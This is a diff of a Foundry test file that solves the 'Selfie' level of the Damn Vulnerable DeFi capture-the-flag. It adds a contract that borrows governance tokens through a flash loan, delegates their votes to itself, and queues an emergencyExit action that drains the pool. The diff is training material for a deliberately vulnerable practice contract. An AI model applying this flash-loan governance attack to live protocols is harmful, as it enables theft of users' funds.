@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,15 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieAttack att = new SelfieAttack(pool, governance);
+        bytes memory data = abi.encodeWithSelector(pool.emergencyExit.selector, recovery);
+
+        uint256 start = block.timestamp;
+
+        pool.flashLoan(att, address(token), TOKENS_IN_POOL, data);
+
+        vm.warp(start + 2.1 days);
+        governance.executeAction(att.actionId());
     }
 
     /**
@@ -72,5 +81,34 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract SelfieAttack is IERC3156FlashBorrower {
+    SelfiePool pool;
+    SimpleGovernance gov;
+    uint256 public actionId;
+
+    constructor(SelfiePool _pool, SimpleGovernance _gov) {
+        pool = _pool;
+        gov = _gov;
+    }
+
+    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata data)
+        external
+        returns (bytes32)
+    {
+        DamnValuableVotes(token).delegate(address(this));
+
+        actionId = gov.queueAction(address(pool), 0, data);
+
+        DamnValuableVotes(token).approve(address(pool), amount);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function withdraw(address token, address recovery) external {
+        uint256 bal = DamnValuableVotes(token).balanceOf(address(this));
+        DamnValuableVotes(token).transfer(recovery, bal);
     }
 }
